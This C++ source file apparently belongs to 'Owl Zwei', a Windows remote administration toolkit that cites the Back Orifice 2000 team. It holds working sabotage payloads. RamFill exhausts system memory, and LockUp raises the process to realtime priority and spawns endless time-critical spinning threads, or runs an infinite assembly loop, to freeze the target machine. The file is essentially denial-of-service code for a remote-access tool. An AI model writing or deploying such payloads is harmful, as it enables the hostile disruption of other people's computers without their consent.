/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#include "bad.h"

__int64 *p64Fill;
/**********************************************************************************/
void RamFill(){	//data oriented screw-up
	p64Fill = new __int64[ GetMaxMem() * 1024 * 1024 * 2 ]; // ( (MiB * 1024 = KiB )*1024 = Bytes ) * 2 = *@#$!!
}
/**********************************************************************************/
int LockUp(){	//Process(thread) oriented screw-up... Thanks to the bo2k team :)
	if( is_NT() ){
		SetPriorityClass( GetCurrentProcess() , REALTIME_PRIORITY_CLASS );
		while(1){
			DWORD tid;
			HANDLE h = CreateThread( NULL , 0 , lockProc , NULL , 0 , &tid );
			SetThreadPriority( h , THREAD_PRIORITY_TIME_CRITICAL );
		}
	}else{
lock_label:
	__asm{ 
			jmp lock_label
		}
	}
	return 0;
}
/**********************************************************************************/
DWORD WINAPI lockProc( LPVOID ptr ){
	while(1);
	return 0;
}
/**********************************************************************************/
